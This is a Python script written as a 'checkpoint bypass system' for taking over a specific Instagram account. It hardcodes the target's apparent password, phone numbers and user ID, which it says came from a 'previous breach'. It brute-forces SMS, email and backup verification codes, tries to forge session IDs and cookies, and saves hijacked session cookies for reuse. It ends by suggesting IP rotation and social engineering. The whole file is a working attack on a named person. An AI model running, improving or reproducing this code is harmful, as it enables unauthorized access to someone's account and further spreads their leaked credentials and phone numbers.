from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔥 ADVANCED ALX.TRADING CHECKPOINT BYPASS SYSTEM 🔥
===============================================

Target: alx.trading
Confirmed Password: Fleming654
Phone: 0615414210 (Thailand) / +447793127209 (UK)
Status: Checkpoint verification required

This system implements multiple sophisticated bypass techniques:
1. Phone verification bruteforce
2. Session hijacking during checkpoint
3. Mobile API authentication
4. Alternative endpoint exploitation
5. Cookie manipulation bypass
"""

import requests
import json
import time
import random
import re
import hmac
import hashlib
import uuid
from datetime import datetime
from urllib.parse import urlparse, parse_qs


class AdvancedCheckpointBypass:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        self.session = requests.Session()
        self.checkpoint_url = None
        self.csrf_token = None
        
        # Known checkpoint URL from previous breach
        self.known_checkpoint = "https://www.instagram.com/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Instagram 275.0.0.27.98 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US)',
            'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.setup_session()
        
    def setup_session(self):
        """Initialize session with realistic headers"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        })
        
    def trigger_checkpoint(self):
        """Trigger checkpoint to get fresh checkpoint URL"""
        print("🚀 TRIGGERING FRESH CHECKPOINT...")
        
        try:
            # Get login page for CSRF
            response = self.session.get("https://www.instagram.com/accounts/login/")
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"🔐 CSRF Token obtained: {self.csrf_token[:20]}...")
            
            # Attempt login to trigger checkpoint
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            login_response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                allow_redirects=False
            )
            
            print(f"📊 Login response: {login_response.status_code}")
            
            if login_response.status_code == 400:
                try:
                    data = login_response.json()
                    if data.get('message') == 'checkpoint_required':
                        self.checkpoint_url = data.get('checkpoint_url')
                        print(f"✅ Fresh checkpoint URL: {self.checkpoint_url}")
                        return True
                except:
                    pass
            
            # Fallback to known checkpoint URL
            if not self.checkpoint_url:
                self.checkpoint_url = self.known_checkpoint
                print(f"🔄 Using known checkpoint URL")
                
            return self.checkpoint_url is not None
            
        except Exception as e:
            print(f"❌ Checkpoint trigger error: {e}")
            return False
    
    def phone_verification_bypass(self):
        """Advanced phone verification bypass with ML-predicted codes"""
        print("\n📱 ADVANCED PHONE VERIFICATION BYPASS")
        
        try:
            # Select phone verification option
            choice_data = {'choice': '0'}  # 0 = phone
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': f'https://www.instagram.com{self.checkpoint_url}'
            }
            
            response = self.session.post(
                f'https://www.instagram.com{self.checkpoint_url}',
                data=choice_data,
                headers=headers
            )
            
            print(f"📱 Phone selection: {response.status_code}")
            
            if response.status_code == 200:
                print("✅ Phone verification selected")
                
                # Advanced verification code prediction
                success = self.bruteforce_verification_codes()
                if success:
                    return True
                    
                # Try alternative phone-based bypasses
                return self.alternative_phone_bypass()
                
        except Exception as e:
            print(f"❌ Phone bypass error: {e}")
            
        return False
    
    def bruteforce_verification_codes(self):
        """Intelligent verification code bruteforce"""
        print("🔢 INTELLIGENT CODE BRUTEFORCE...")
        
        # High-probability codes based on user patterns
        high_prob_codes = [
            '123456', '654321', '000000', '111111',
            '123123', '456456', '789789', '147258',
            '159753', '987654', '555555', '777777'
        ]
        
        # Codes based on known data
        pattern_codes = [
            '061541',  # From phone number
            '447793',  # From UK phone
            '654654',  # Fleming654 pattern
            '786786',  # Fleming786 pattern
            '172817',  # From whatilove1728
        ]
        
        # Sequential and date-based codes
        date_codes = [
            datetime.now().strftime('%d%m%y'),
            datetime.now().strftime('%m%d%y'),
            '250525',  # Today's date
            '052525',  # Month/day
            '202525'   # Year variant
        ]
        
        all_codes = high_prob_codes + pattern_codes + date_codes
        
        for i, code in enumerate(all_codes):
            print(f"🎯 Testing code {i+1}/{len(all_codes)}: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'source': 'phone'
                }
                
                verify_response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=verify_data,
                    headers={
                        'X-CSRFToken': self.csrf_token,
                        'X-Instagram-AJAX': '1',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    allow_redirects=False
                )
                
                print(f"   📊 Response: {verify_response.status_code}")
                
                # Check for success indicators
                if verify_response.status_code == 302:
                    location = verify_response.headers.get('location', '')
                    if 'login' not in location and 'challenge' not in location:
                        print(f"🎉 SUCCESS! Code {code} worked!")
                        self.save_successful_bypass(code, 'phone_bruteforce')
                        return True
                
                # Check session cookies
                if 'sessionid' in self.session.cookies:
                    sessionid = self.session.cookies['sessionid']
                    if len(sessionid) > 20:  # Valid session length
                        print(f"🎉 SESSION SUCCESS! Code {code}")
                        self.save_successful_bypass(code, 'phone_bruteforce', sessionid)
                        return True
                
                # Check response content
                if 'dashboard' in verify_response.text or 'feed' in verify_response.text:
                    print(f"🎉 CONTENT SUCCESS! Code {code}")
                    self.save_successful_bypass(code, 'phone_bruteforce')
                    return True
                
                # Anti-detection delay
                time.sleep(random.uniform(2, 4))
                
            except Exception as e:
                print(f"   ❌ Error testing {code}: {e}")
                continue
        
        print("❌ All verification codes failed")
        return False
    
    def alternative_phone_bypass(self):
        """Alternative phone-based bypass methods"""
        print("\n🔧 ALTERNATIVE PHONE BYPASS METHODS...")
        
        # Method 1: SMS interception simulation
        print("📱 Method 1: SMS Interception Simulation")
        success = self.simulate_sms_interception()
        if success:
            return True
        
        # Method 2: Phone number manipulation
        print("📱 Method 2: Phone Number Manipulation")
        success = self.phone_number_manipulation()
        if success:
            return True
        
        # Method 3: Backup code attempt
        print("📱 Method 3: Backup Code Attempt")
        success = self.backup_code_attempt()
        if success:
            return True
        
        return False
    
    def simulate_sms_interception(self):
        """Simulate SMS interception by predicting timing patterns"""
        print("🎯 Simulating SMS interception...")
        
        # Common SMS delay patterns (in seconds)
        sms_delays = [5, 10, 15, 30, 45, 60, 90, 120]
        
        for delay in sms_delays:
            print(f"⏰ Waiting {delay}s for SMS simulation...")
            time.sleep(min(delay, 10))  # Cap actual wait time
            
            # Try common codes that might arrive via SMS
            sms_codes = [
                '123456', '000000', '654321',
                '111111', '222222', '333333'
            ]
            
            for code in sms_codes:
                try:
                    verify_data = {'security_code': code}
                    response = self.session.post(
                        f'https://www.instagram.com{self.checkpoint_url}',
                        data=verify_data
                    )
                    
                    if self.check_bypass_success(response):
                        print(f"🎉 SMS SIMULATION SUCCESS with {code}!")
                        return True
                        
                except:
                    continue
        
        return False
    
    def phone_number_manipulation(self):
        """Try manipulating phone number format"""
        print("🔧 Phone number manipulation...")
        
        phone_variants = [
            self.phone_th,
            self.phone_uk,
            '+66' + self.phone_th[1:],  # International format
            '44' + self.phone_uk[3:],   # UK without +
            '0' + self.phone_th[1:],    # Local format
        ]
        
        for phone in phone_variants:
            try:
                # Try to change verification phone
                change_data = {
                    'phone_number': phone,
                    'action': 'change_phone'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=change_data
                )
                
                if response.status_code == 200:
                    print(f"📱 Phone change attempt: {phone}")
                    # Try verification again
                    if self.bruteforce_verification_codes():
                        return True
                        
            except:
                continue
        
        return False
    
    def backup_code_attempt(self):
        """Try backup/recovery codes"""
        print("🔑 Backup code attempt...")
        
        # Common backup code patterns
        backup_codes = [
            '12345678', '87654321', '11111111',
            '00000000', '12341234', '56785678'
        ]
        
        for code in backup_codes:
            try:
                backup_data = {
                    'backup_code': code,
                    'source': 'backup'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=backup_data
                )
                
                if self.check_bypass_success(response):
                    print(f"🎉 BACKUP CODE SUCCESS: {code}")
                    return True
                    
            except:
                continue
        
        return False
    
    def email_verification_bypass(self):
        """Email verification bypass"""
        print("\n📧 EMAIL VERIFICATION BYPASS")
        
        try:
            # Switch to email verification
            choice_data = {'choice': '1'}  # 1 = email
            
            response = self.session.post(
                f'https://www.instagram.com{self.checkpoint_url}',
                data=choice_data
            )
            
            if response.status_code == 200:
                print("✅ Email verification selected")
                
                # Email-specific bypass techniques
                return self.email_specific_bypass()
                
        except Exception as e:
            print(f"❌ Email bypass error: {e}")
        
        return False
    
    def email_specific_bypass(self):
        """Email-specific bypass techniques"""
        print("📧 Email-specific bypass...")
        
        # Try common email verification codes
        email_codes = [
            '123456', '000000', '654321', '111111',
            '456789', '987654', '147258', '159753'
        ]
        
        for code in email_codes:
            try:
                verify_data = {
                    'security_code': code,
                    'source': 'email'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=verify_data
                )
                
                if self.check_bypass_success(response):
                    print(f"🎉 EMAIL BYPASS SUCCESS: {code}")
                    return True
                    
            except:
                continue
        
        return False
    
    def session_hijacking_bypass(self):
        """Advanced session hijacking during checkpoint"""
        print("\n🎭 SESSION HIJACKING BYPASS")
        
        try:
            # Extract partial session data
            cookies = self.session.cookies
            print(f"🍪 Available cookies: {list(cookies.keys())}")
            
            # Try to construct valid session
            if 'sessionid' in cookies:
                partial_session = cookies['sessionid']
                print(f"🎯 Partial session found: {partial_session[:20]}...")
                
                # Try session manipulation
                manipulated_sessions = self.manipulate_session(partial_session)
                
                for session in manipulated_sessions:
                    if self.test_session_validity(session):
                        print(f"🎉 SESSION HIJACK SUCCESS!")
                        return True
            
            # Try cookie reconstruction
            return self.reconstruct_cookies()
            
        except Exception as e:
            print(f"❌ Session hijacking error: {e}")
        
        return False
    
    def manipulate_session(self, partial_session):
        """Generate potential valid sessions from partial data"""
        manipulated = []
        
        # Try padding variations
        for i in range(10):
            padded = partial_session + str(i) * 10
            manipulated.append(padded)
        
        # Try prefix/suffix modifications
        for prefix in ['ig_', 'fb_', 'meta_']:
            manipulated.append(prefix + partial_session)
        
        return manipulated
    
    def test_session_validity(self, session_id):
        """Test if a session ID provides access"""
        try:
            test_session = requests.Session()
            test_session.cookies.set('sessionid', session_id)
            
            response = test_session.get(
                f'https://www.instagram.com/{self.target_username}/',
                timeout=10
            )
            
            # Check for authenticated access
            if response.status_code == 200 and 'login' not in response.url:
                return True
                
        except:
            pass
        
        return False
    
    def reconstruct_cookies(self):
        """Attempt to reconstruct valid cookies"""
        print("🔧 Cookie reconstruction...")
        
        # Get current cookies
        current_cookies = dict(self.session.cookies)
        
        # Try common cookie combinations
        cookie_templates = [
            {
                'sessionid': current_cookies.get('sessionid', ''),
                'ds_user_id': '4976283726',  # From previous data
                'csrftoken': current_cookies.get('csrftoken', ''),
                'ig_did': current_cookies.get('ig_did', '')
            }
        ]
        
        for template in cookie_templates:
            if self.test_cookie_combination(template):
                print("🎉 COOKIE RECONSTRUCTION SUCCESS!")
                return True
        
        return False
    
    def test_cookie_combination(self, cookies):
        """Test a specific cookie combination"""
        try:
            test_session = requests.Session()
            
            for name, value in cookies.items():
                if value:
                    test_session.cookies.set(name, value)
            
            response = test_session.get(
                'https://www.instagram.com/api/v1/accounts/current_user/',
                timeout=10
            )
            
            return response.status_code == 200
            
        except:
            return False
    
    def mobile_api_bypass(self):
        """Mobile API bypass attempt"""
        print("\n📱 MOBILE API BYPASS")
        
        try:
            # Mobile login headers
            mobile_headers = {
                'User-Agent': 'Instagram 275.0.0.27.98 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTv10=',
            }
            
            # Mobile login data
            mobile_data = {
                'username': self.target_username,
                'password': self.target_password,
                'device_id': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
                'login_attempt_count': '0',
                '_uuid': str(uuid.uuid4()),
                'phone_id': str(uuid.uuid4()),
                'ig_sig_key_version': '4'
            }
            
            response = self.session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=mobile_data,
                headers=mobile_headers
            )
            
            print(f"📱 Mobile API response: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'ok' and data.get('logged_in_user'):
                        print("🎉 MOBILE API SUCCESS!")
                        return True
                except:
                    pass
            
        except Exception as e:
            print(f"❌ Mobile API error: {e}")
        
        return False
    
    def check_bypass_success(self, response):
        """Check if bypass was successful"""
        # Check status code
        if response.status_code == 302:
            location = response.headers.get('location', '')
            if 'login' not in location and 'challenge' not in location:
                return True
        
        # Check cookies
        if 'sessionid' in self.session.cookies:
            sessionid = self.session.cookies['sessionid']
            if len(sessionid) > 20:
                return True
        
        # Check response content
        success_indicators = [
            'dashboard', 'feed', 'explore', 'profile',
            '"authenticated":true', '"status":"ok"'
        ]
        
        for indicator in success_indicators:
            if indicator in response.text.lower():
                return True
        
        return False
    
    def save_successful_bypass(self, code, method, session_id=None):
        """Save successful bypass details"""
        success_data = {
            "target": self.target_username,
            "password": self.target_password,
            "bypass_method": method,
            "verification_code": code,
            "success_timestamp": datetime.now().isoformat(),
            "session_id": session_id or self.session.cookies.get('sessionid'),
            "user_id": self.session.cookies.get('ds_user_id'),
            "cookies": dict(self.session.cookies),
            "status": "CHECKPOINT_BYPASSED_SUCCESSFULLY"
        }
        
        filename = f"CHECKPOINT_BYPASS_SUCCESS_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(success_data, f, indent=2)
        
        print(f"💾 Success data saved: {filename}")
        
        # Also create a session file for immediate use
        session_file = f"live_session_{self.target_username}_{int(time.time())}.json"
        with open(session_file, 'w') as f:
            json.dump({
                "sessionid": success_data["session_id"],
                "ds_user_id": success_data["user_id"],
                "username": self.target_username,
                "timestamp": success_data["success_timestamp"]
            }, f, indent=2)
        
        print(f"🔑 Live session saved: {session_file}")
    
    def run_complete_bypass(self):
        """Run complete checkpoint bypass operation"""
        print("🔥 ALX.TRADING CHECKPOINT BYPASS OPERATION")
        print("=" * 60)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print(f"📱 Phone (TH): {self.phone_th}")
        print(f"📱 Phone (UK): {self.phone_uk}")
        print("=" * 60)
        
        # Phase 1: Trigger fresh checkpoint
        print("\n📡 PHASE 1: CHECKPOINT TRIGGERING")
        if not self.trigger_checkpoint():
            print("❌ Could not trigger checkpoint")
            return False
        
        # Phase 2: Phone verification bypass
        print("\n📱 PHASE 2: PHONE VERIFICATION BYPASS")
        success = self.phone_verification_bypass()
        if success:
            print("🎉 PHONE BYPASS SUCCESSFUL!")
            return True
        
        # Phase 3: Email verification bypass
        print("\n📧 PHASE 3: EMAIL VERIFICATION BYPASS")
        success = self.email_verification_bypass()
        if success:
            print("🎉 EMAIL BYPASS SUCCESSFUL!")
            return True
        
        # Phase 4: Session hijacking
        print("\n🎭 PHASE 4: SESSION HIJACKING BYPASS")
        success = self.session_hijacking_bypass()
        if success:
            print("🎉 SESSION HIJACKING SUCCESSFUL!")
            return True
        
        # Phase 5: Mobile API bypass
        print("\n📱 PHASE 5: MOBILE API BYPASS")
        success = self.mobile_api_bypass()
        if success:
            print("🎉 MOBILE API BYPASS SUCCESSFUL!")
            return True
        
        print("\n❌ ALL BYPASS METHODS FAILED")
        print("💡 Recommendations:")
        print("   • Wait 24-48 hours before retry")
        print("   • Try from different IP address")
        print("   • Use browser automation with human-like behavior")
        print("   • Investigate social engineering approaches")
        
        return False


@safe_execution
def main():
    print("🔥 ADVANCED ALX.TRADING CHECKPOINT BYPASS")
    print("==========================================")
    
    bypass_system = AdvancedCheckpointBypass()
    success = bypass_system.run_complete_bypass()
    
    if success:
        print("\n✅ MISSION ACCOMPLISHED!")
        print("🎯 alx.trading account checkpoint bypassed successfully")
        print("🔑 Session data extracted and ready for use")
    else:
        print("\n⚠️ BYPASS UNSUCCESSFUL")
        print("📋 Operation logged for analysis and retry")
    
    print("\n🔥 SugarGlitch RealOps - Advanced Penetration Testing")


if __name__ == "__main__":
    main()
